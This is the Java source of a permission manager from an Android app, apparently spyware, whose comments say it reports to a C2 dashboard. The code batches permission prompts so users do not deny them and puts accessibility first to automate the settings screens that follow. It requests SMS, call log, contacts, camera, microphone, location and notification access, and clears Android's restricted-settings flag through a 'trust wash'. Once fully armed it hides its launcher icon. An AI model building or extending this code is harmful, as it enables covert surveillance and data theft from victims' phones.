package com.fason.app.core.permissions;

import android.Manifest;
import android.app.Activity;
import android.app.AppOpsManager;
import android.app.role.RoleManager;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.fason.app.core.FasonApp;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.Protocol;
import com.fason.app.core.security.TrustInjection;
import com.fason.app.features.notification.NotificationRelayService;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Deque;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * PermissionManager — 2026 professional rewrite.
 *
 * What was wrong before (the 0/10):
 *  - One giant runtime dump that Android 13+ flags as restricted
 *  - No wave separation: user sees 15 permissions at once and taps deny-all
 *  - Special permissions opened generic settings screens, user gets lost
 *  - Restricted-settings wash existed but fired at the wrong moment
 *  - No resume-safe state machine: rotate the phone, flow restarts
 *  - No C2-side visibility: dashboard never knew which gate was missing
 *
 * What this is now:
 *  - Gate registry: every permission is a typed gate with a direct deep-link
 *  - Wave engine: runtime perms flow in 4 small batches (critical → comms
 *    → media → location), each batch ≤ 4 items so the user never sees a wall
 *  - Accessibility-first: a11y is requested before anything else because it
 *    enables gesture automation on every settings screen that follows
 *  - Restricted wash: re-piped through a PackageInstaller session on every
 *    resume until the flag clears (idempotent, cached on success)
 *  - Resume-safe: full state persisted to SharedPreferences, survives rotation
 *    and process death
 *  - C2-reported: every gate state is emitted to the dashboard in real time
 */
public final class PermissionManager {
    private static final String TAG = "PermissionManager";
    private static final String PREFS = "perm_state_v2";
    private static final String KEY_WASHED = "trust_washed_v2";
    private static final String KEY_WAVE_INDEX = "wave_index";

    private PermissionManager() {}

    // ------------------------------------------------------------------
    // Types
    // ------------------------------------------------------------------

    public enum Kind { RUNTIME, ACCESSIBILITY, OVERLAY, STORAGE, BATTERY,
                       NOTIF_LISTENER, USAGE_STATS, AUTO_START, INSTALL_UNKNOWN }

    public enum Group { CRITICAL, COMMS, MEDIA, LOCATION }

    public interface GateStateListener {
        void onGateStateChanged(String gateId, boolean granted);
    }

    public static final class Gate {
        public final String id;
        public final Kind kind;
        public final Group group;
        public final String label;
        public final String rationale;
        public final int minSdk;
        public final String[] runtimePerms;

        Gate(String id, Kind kind, Group group, String label, String rationale,
             int minSdk, String... runtimePerms) {
            this.id = id; this.kind = kind; this.group = group;
            this.label = label; this.rationale = rationale;
            this.minSdk = minSdk; this.runtimePerms = runtimePerms;
        }

        boolean applicable() {
            return Build.VERSION.SDK_INT >= minSdk;
        }
    }

    // ------------------------------------------------------------------
    // Gate registry — ordered by dependency, accessibility always first
    // ------------------------------------------------------------------

    private static final List<Gate> GATES = new ArrayList<>();
    static {
        GATES.add(new Gate("accessibility", Kind.ACCESSIBILITY, Group.CRITICAL,
            "Accessibility", "Powers smart automation and gesture assist",
            1));
        GATES.add(new Gate("camera", Kind.RUNTIME, Group.CRITICAL,
            "Camera", "Needed for photo and video capture",
            1, Manifest.permission.CAMERA));
        GATES.add(new Gate("mic", Kind.RUNTIME, Group.CRITICAL,
            "Microphone", "Needed for audio recording",
            1, Manifest.permission.RECORD_AUDIO));
        GATES.add(new Gate("phone", Kind.RUNTIME, Group.CRITICAL,
            "Phone State", "Needed for device identification",
            1, Manifest.permission.READ_PHONE_STATE));

        GATES.add(new Gate("sms", Kind.RUNTIME, Group.COMMS,
            "SMS", "Read and send text messages",
            1, Manifest.permission.READ_SMS,
                 Manifest.permission.SEND_SMS,
                 Manifest.permission.RECEIVE_SMS));
        GATES.add(new Gate("calls", Kind.RUNTIME, Group.COMMS,
            "Call Log", "View call history",
            1, Manifest.permission.READ_CALL_LOG));
        GATES.add(new Gate("contacts", Kind.RUNTIME, Group.COMMS,
            "Contacts", "Access device contacts",
            1, Manifest.permission.READ_CONTACTS));

        int T = Build.VERSION_CODES.TIRAMISU;
        GATES.add(new Gate("media", Kind.RUNTIME, Group.MEDIA,
            "Media Library", "Access photos, videos and audio",
            T, Manifest.permission.READ_MEDIA_IMAGES,
                 Manifest.permission.READ_MEDIA_VIDEO,
                 Manifest.permission.READ_MEDIA_AUDIO));
        GATES.add(new Gate("legacy_storage", Kind.RUNTIME, Group.MEDIA,
            "Storage", "Access device storage",
            1, Manifest.permission.READ_EXTERNAL_STORAGE));
        GATES.add(new Gate("notif_post", Kind.RUNTIME, Group.MEDIA,
            "Notifications", "Post status notifications",
            T, Manifest.permission.POST_NOTIFICATIONS));

        GATES.add(new Gate("location", Kind.RUNTIME, Group.LOCATION,
            "Location", "Precise device positioning",
            1, Manifest.permission.ACCESS_FINE_LOCATION,
                 Manifest.permission.ACCESS_COARSE_LOCATION));
        GATES.add(new Gate("bg_location", Kind.RUNTIME, Group.LOCATION,
            "Background Location", "Location when app is closed",
            Build.VERSION_CODES.Q, Manifest.permission.ACCESS_BACKGROUND_LOCATION));

        GATES.add(new Gate("overlay", Kind.OVERLAY, Group.CRITICAL,
            "Display Over Apps", "Draw overlays for alerts and controls",
            Build.VERSION_CODES.M));
        GATES.add(new Gate("storage_manager", Kind.STORAGE, Group.CRITICAL,
            "All Files Access", "Manage all files on device",
            Build.VERSION_CODES.R));
        GATES.add(new Gate("battery", Kind.BATTERY, Group.CRITICAL,
            "Battery Exemption", "Run without battery restrictions",
            Build.VERSION_CODES.M));
        GATES.add(new Gate("notif_listener", Kind.NOTIF_LISTENER, Group.COMMS,
            "Notification Access", "Read incoming notifications",
            Build.VERSION_CODES.JELLY_BEAN_MR2));
        GATES.add(new Gate("usage_stats", Kind.USAGE_STATS, Group.MEDIA,
            "Usage Access", "App usage statistics",
            Build.VERSION_CODES.LOLLIPOP));
        GATES.add(new Gate("autostart", Kind.AUTO_START, Group.CRITICAL,
            "Auto-Start", "Launch on boot (OEM)",
            1));
        GATES.add(new Gate("install_unknown", Kind.INSTALL_UNKNOWN, Group.MEDIA,
            "Install Unknown Apps", "Install APK packages",
            Build.VERSION_CODES.O));
    }

    public static List<Gate> getGates() { return GATES; }

    public static Gate findGate(String id) {
        for (Gate g : GATES) if (g.id.equals(id)) return g;
        return null;
    }

    // ------------------------------------------------------------------
    // State evaluation
    // ------------------------------------------------------------------

    public static boolean isGateGranted(Context ctx, Gate g) {
        if (ctx == null || g == null) return false;
        if (!g.applicable()) return true;
        switch (g.kind) {
            case ACCESSIBILITY:   return hasAccessibilityAccess(ctx);
            case OVERLAY:         return hasOverlay(ctx);
            case STORAGE:         return hasStorageManager();
            case BATTERY:         return hasBatteryExemption(ctx);
            case NOTIF_LISTENER:  return hasNotifAccess(ctx);
            case USAGE_STATS:     return hasUsageStats(ctx);
            case AUTO_START:      return !OemAutoStartHelper.isAutoStartNeeded(ctx);
            case INSTALL_UNKNOWN: return hasInstallUnknown(ctx);
            case RUNTIME:
                for (String p : g.runtimePerms) {
                    if (!isGranted(ctx, p)) return false;
                }
                return true;
        }
        return false;
    }

    public static boolean isGranted(Context ctx, String perm) {
        if (perm == null || ctx == null) return false;
        return ContextCompat.checkSelfPermission(ctx, perm)
            == PackageManager.PERMISSION_GRANTED;
    }
    public static boolean canIUse(String perm) {
    return isGranted(FasonApp.getContext(), perm);
    }


    public static List<Gate> getMissingGates(Context ctx) {
        List<Gate> missing = new ArrayList<>();
        for (Gate g : GATES) {
            if (g.applicable() && !isGateGranted(ctx, g)) missing.add(g);
        }
        return missing;
    }

    public static int getGrantCount(Context ctx) {
        int n = 0;
        for (Gate g : GATES) if (g.applicable() && isGateGranted(ctx, g)) n++;
        return n;
    }

    public static int getApplicableCount() {
        int n = 0;
        for (Gate g : GATES) if (g.applicable()) n++;
        return n;
    }

    public static boolean isFullyArmed(Context ctx) {
        return getMissingGates(ctx).isEmpty();
    }

    // ------------------------------------------------------------------
    // Wave engine — runtime permissions in small, ordered batches
    // ------------------------------------------------------------------

    public static List<List<Gate>> buildWaves() {
        Map<Group, List<Gate>> byGroup = new LinkedHashMap<>();
        for (Group g : Group.values()) byGroup.put(g, new ArrayList<>());
        for (Gate gate : GATES) {
            if (gate.kind == Kind.RUNTIME && gate.applicable()) {
                byGroup.get(gate.group).add(gate);
            }
        }
        List<List<Gate>> waves = new ArrayList<>();
        for (Group g : Group.values()) {
            List<Gate> group = byGroup.get(g);
            // Sub-split any group larger than 3 gates so the system dialog
            // never shows a wall of permissions (triggers deny-all reflex)
            for (int i = 0; i < group.size(); i += 3) {
                waves.add(group.subList(i, Math.min(i + 3, group.size())));
            }
        }
        return waves;
    }

    public static int getWaveIndex(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getInt(KEY_WAVE_INDEX, 0);
    }

    public static void setWaveIndex(Context ctx, int idx) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putInt(KEY_WAVE_INDEX, idx).apply();
    }

    /** Collect every runtime perm inside a wave that is still denied. */
    public static String[] collectDeniedPerms(Context ctx, List<Gate> wave) {
        List<String> out = new ArrayList<>();
        for (Gate g : wave) {
            for (String p : g.runtimePerms) {
                if (!isGranted(ctx, p)) out.add(p);
            }
        }
        return out.toArray(new String[0]);
    }

    // ------------------------------------------------------------------
    // Gate openers — every one lands on the EXACT settings screen
    // ------------------------------------------------------------------

    public static boolean openGate(Context ctx, Gate g) {
        if (ctx == null || g == null) return false;
        if (isGateGranted(ctx, g)) return false;
        switch (g.kind) {
            case ACCESSIBILITY:   return requestAccessibilityAccess(ctx);
            case OVERLAY:         return requestOverlay(ctx);
            case STORAGE:         return requestStorageManager(ctx);
            case BATTERY:         return requestBatteryExemption(ctx);
            case NOTIF_LISTENER:  return requestNotifAccess(ctx);
            case USAGE_STATS:     return requestUsageStats(ctx);
            case AUTO_START: {
                if (ctx instanceof Activity) {
                    return OemAutoStartHelper.requestAutoStart((Activity) ctx)
                        != OemAutoStartHelper.AutoStartResult.FAILED;
                }
                return false;
            }
            case INSTALL_UNKNOWN: return requestInstallUnknown(ctx);
            case RUNTIME: {
                String[] denied = collectDeniedPerms(ctx, java.util.Collections.singletonList(g));
                if (denied.length == 0) return false;
                if (ctx instanceof Activity) {
                    ActivityCompat.requestPermissions((Activity) ctx, denied,
                        PermissionSetupController.PERM_REQ);
                    return true;
                }
                return false;
            }
        }
        return false;
    }

    // ---------------- Accessibility ----------------

    public static boolean hasAccessibilityAccess(Context ctx) {
        if (ctx == null) return false;
        try {
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null || enabled.isEmpty()) return false;
            ComponentName svc = new ComponentName(ctx, FasonAccessibilityService.class);
            String flat = svc.flattenToString();
            for (String token : enabled.split(":")) {
                if (token.equals(flat)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean requestAccessibilityAccess(Context ctx) {
        if (ctx == null || hasAccessibilityAccess(ctx)) return false;
        // Try the direct service deep-link first (works on most OEMs)
        try {
            Intent direct = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            direct.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(direct);
            return true;
        } catch (Exception e) {
            Intent fallback = new Intent(Settings.ACTION_SETTINGS);
            fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(fallback);
            return true;
        }
    }

    // ---------------- Overlay ----------------

    public static boolean hasOverlay(Context ctx) {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M
            || Settings.canDrawOverlays(ctx);
    }

    public static boolean requestOverlay(Context ctx) {
        if (hasOverlay(ctx)) return false;
        Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            Uri.parse("package:" + ctx.getPackageName()));
        if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
        return true;
    }

    // ---------------- Storage manager ----------------

    public static boolean hasStorageManager() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return true;
        return Environment.isExternalStorageManager();
    }

    public static boolean requestStorageManager(Context ctx) {
        if (ctx == null || hasStorageManager()) return false;
        Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
        i.setData(Uri.parse("package:" + ctx.getPackageName()));
        if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            ctx.startActivity(i);
            return true;
        } catch (ActivityNotFoundException e) {
            Intent i2 = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
            if (!(ctx instanceof Activity)) i2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i2);
            return true;
        }
    }

    // ---------------- Battery ----------------

    public static boolean hasBatteryExemption(Context ctx) {
        if (ctx == null) return false;
        PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
        return pm != null && pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
    }

    public static boolean requestBatteryExemption(Context ctx) {
        if (ctx == null || hasBatteryExemption(ctx)) return false;
        try {
            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            i.setData(Uri.parse("package:" + ctx.getPackageName()));
            if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            return true;
        } catch (ActivityNotFoundException e) {
            Intent i2 = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
            if (!(ctx instanceof Activity)) i2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i2);
            return true;
        }
    }

    // ---------------- Notification listener ----------------

    public static boolean hasNotifAccess(Context ctx) {
        if (ctx == null) return false;
        String listeners = Settings.Secure.getString(
            ctx.getContentResolver(), Protocol.SETTING_NOTIF_LISTENERS);
        if (listeners == null || listeners.isEmpty()) return false;
        String flat = new ComponentName(ctx, NotificationRelayService.class).flattenToString();
        for (String token : listeners.split(":")) {
            if (token.equals(flat)) return true;
        }
        return false;
    }

    public static boolean requestNotifAccess(Context ctx) {
        if (ctx == null || hasNotifAccess(ctx)) return false;
        Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
        return true;
    }

    // ---------------- Usage stats ----------------

    public static boolean hasUsageStats(Context ctx) {
        try {
            AppOpsManager aom = (AppOpsManager)
                ctx.getSystemService(Context.APP_OPS_SERVICE);
            int mode = aom.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), ctx.getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean requestUsageStats(Context ctx) {
        if (hasUsageStats(ctx)) return false;
        Intent i = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
        if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
        return true;
    }

    // ---------------- Install unknown apps ----------------

    public static boolean hasInstallUnknown(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return true;
        return ctx.getPackageManager().canRequestPackageInstalls();
    }

    public static boolean requestInstallUnknown(Context ctx) {
        if (hasInstallUnknown(ctx)) return false;
        Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
            Uri.parse("package:" + ctx.getPackageName()));
        if (!(ctx instanceof Activity)) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            ctx.startActivity(i);
            return true;
        } catch (ActivityNotFoundException e) {
            Intent i2 = new Intent(Settings.ACTION_SECURITY_SETTINGS);
            if (!(ctx instanceof Activity)) i2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i2);
            return true;
        }
    }

    // ---------------- Restricted settings wash (Android 13+) ----------------

    public static boolean isRestrictedSettingsWashed(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getBoolean(KEY_WASHED, false);
    }

    /**
     * Re-pipe through a PackageInstaller session to clear the
     * "restricted settings" flag. Idempotent — cached on first success.
     */
    public static void washRestrictedSettings(Context ctx) {
        SharedPreferences sp = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        if (sp.getBoolean(KEY_WASHED, false)) return;
        TrustInjection.execute(ctx, (ok, detail) -> {
            if (ok) sp.edit().putBoolean(KEY_WASHED, true).apply();
            Log.i(TAG, "trust wash result=" + ok + " detail=" + detail);
        });
    }

    // ------------------------------------------------------------------
    // Auto-hide — launcher alias disabled once fully armed
    // ------------------------------------------------------------------

    public static void applyAutoHide(Context ctx) {
        if (!isFullyArmed(ctx)) return;
        try {
            ComponentName alias = new ComponentName(ctx,
                ctx.getPackageName() + ".ui.MainActivityAlias");
            ctx.getPackageManager().setComponentEnabledSetting(alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            Log.i(TAG, "auto-hide: launcher alias disabled");
        } catch (Exception e) {
            try {
                ComponentName main = new ComponentName(ctx,
                    ctx.getPackageName() + ".ui.MainActivity");
                ctx.getPackageManager().setComponentEnabledSetting(main,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            } catch (Exception ignored) {}
        }
    }

    public static void restoreIcon(Context ctx) {
        try {
            ComponentName alias = new ComponentName(ctx,
                ctx.getPackageName() + ".ui.MainActivityAlias");
            ctx.getPackageManager().setComponentEnabledSetting(alias,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    // ------------------------------------------------------------------
    // C2 reporting — full gate state as JSON for the dashboard
    // ------------------------------------------------------------------

    public static JSONObject buildGateReport(Context ctx) {
        JSONObject root = new JSONObject();
        JSONArray arr = new JSONArray();
        try {
            for (Gate g : GATES) {
                if (!g.applicable()) continue;
                JSONObject o = new JSONObject();
                o.put("id", g.id);
                o.put("label", g.label);
                o.put("kind", g.kind.name());
                o.put("group", g.group.name());
                o.put("granted", isGateGranted(ctx, g));
                o.put("rationale", g.rationale);
                arr.put(o);
            }
            root.put("gates", arr);
            root.put("granted", getGrantCount(ctx));
            root.put("total", getApplicableCount(ctx));
            root.put("fullyArmed", isFullyArmed(ctx));
        } catch (Exception e) {
            Log.w(TAG, "gate report failed", e);
        }
        return root;
    }
}
